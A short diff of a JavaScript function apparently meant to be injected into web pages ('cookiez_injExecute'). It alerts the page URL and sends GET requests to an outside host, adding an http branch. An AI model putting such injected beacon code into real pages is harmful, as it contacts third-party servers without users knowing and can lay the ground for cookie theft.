@@ -11,7 +11,14 @@
 
 function cookiez_injExecute() {
 	alert(window.location.href);
-	httpGetAsync("https://l.ccr.ovh/test.php", function() {
+	
+	if(location.protocol == "http:") {
+		httpGetAsync("http://l.ccr.ovh/test.php", function() {
+			console.log("co");
+		});
+	}
+	
+	httpGetAsync("http://l.ccr.ovh/test.php", function() {
 		console.log("co");
 	});
 }
